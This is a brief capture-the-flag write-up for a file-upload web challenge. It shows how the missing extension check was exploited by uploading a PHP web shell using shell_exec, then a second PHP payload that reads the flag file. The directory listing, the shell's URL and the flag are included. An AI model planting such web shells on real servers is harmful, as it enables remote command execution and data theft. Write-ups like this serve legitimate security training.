# Web Exotic Attacks Meme Uploader

The form uses **enctype="multipart/form-data"** with a **POST** request. The input field is:

```html
<input name="fileToUpload" type="file">
```

After uploading, it returns: ***Your file [filename] has been uploaded successfully!***. No download/view link is provided, we found the the files probably to to **/uploads/[filename]**.

The server does not restrict .php extensions, as seen later. So I created a simple PHP shell to enumerate file paths using:
```php
<?php echo "<pre>" . shell_exec('ls -la ../'); ?>
```

Found:

```
total 20
drwxrwxrwx 5 www-data www-data 4096 Jul 17 14:17 .
drwxr-xr-x 9 root     root     4096 Jul 17 14:17 ..
-rw-r--r-- 1 root     root       40 Jul 18  2024 flag.txt
-rw-r--r-- 1 root     root     2125 Jul 18  2024 index.php
drwxrwxrwx 2 root     root     4096 Jul 17 14:48 uploads
```

I updated the payload to print the flag:
```php
<?php echo file_get_contents('../flag.txt'); ?>
```

Uploaded as a new file, uploaded as f49cb1791fc33df072e3feb4dc4d854e.php . Accessing **http://141.85.224.99:8003/uploads/f49cb1791fc33df072e3feb4dc4d854e.php** revealed the flag: **SSS{at_l3ast_ch3ck_f0r_3xt3nsi0ns_n00b}**
